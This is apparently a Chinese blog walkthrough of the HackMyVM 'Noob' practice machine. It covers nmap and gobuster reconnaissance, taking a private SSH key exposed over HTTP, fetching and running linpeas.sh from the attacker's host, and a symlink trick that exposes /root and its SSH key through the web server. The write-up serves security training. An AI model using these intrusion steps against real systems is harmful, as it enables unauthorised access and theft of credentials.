> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0WPvhp-_folEPh95CGZXEw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 59篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUt7Vciby9ebeZbZ7Ptxf9Jxv3Oh5vUrDEm7TzpC0LINFVLHkTCfz1GXym34xfAGWzWb9O9Ud9OhniaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Noob  
网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
```

靶场: HackMyVm.eu

靶机名称: Noob

难度: 简单

发布时间: 2021年7月15日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:VMware kali 10.0.0.3  
  
靶机:Vbox linux IP自动获取
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 10.0.0.3/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为10.0.0.107

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 10.0.0.7 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到22端口和65530端口开放，通过nmap扫描结果可以看到65530端口为HTTP服务。访问65530端口

```
http://10.0.0.107:65530
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后提示找不到页面，我们用目录扫描检查下可利用的url

```
gobuster dir -u http://10.0.0.107:65530 -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到/index和/nt4share两个url，先看下index

Web渗透
-----

```
http://10.0.0.107:65530/index
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提示很近了，再看看另一个页面

```
http://10.0.0.107:65530/nt4share/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

猜测这是个用户目录，来看看.ssh里面有没有id_rsa文件

```
http://10.0.0.107:65530/nt4share/.ssh/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果这是个用户目录，那么就可以通过id_rsa文件登录到主机，验证下

```
wget http://10.0.0.107:65530/nt4share/.ssh/id_rsa  
chmdo 600 id_rsa  
ssh nt4share@10.0.0.107
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

无法登录 ，难道是用户名错了？把公钥也下载下来看看

```
wget http://10.0.0.107:65530/nt4share/.ssh/id_rsa.pub  
cat id_rsa.pub
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

果然，账号是adela，再来验证下

```
ssh adela@10.0.0.107 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，手动没找到提权信息，上传上辅助提权脚本

```
cd /tmp  
wget http://10.0.0.3:8000/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

仍然没找到可利用的信息，回头再看一遍。http可以访问用户目录这个权限应该很大，可台尝试将其他文件做软链接到adela目录下再用web访问，如果权限够高就能读取，验证一下

```
cd /home/adela  
ln -s /root root
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

创建完软链接，去web上验证下

```
http://10.0.0.107:65530/nt4share/root
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到2个flag，如果你想以root身份登录可以下载root目录下.ssh内的id_rsa文件再登录，游戏结束。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)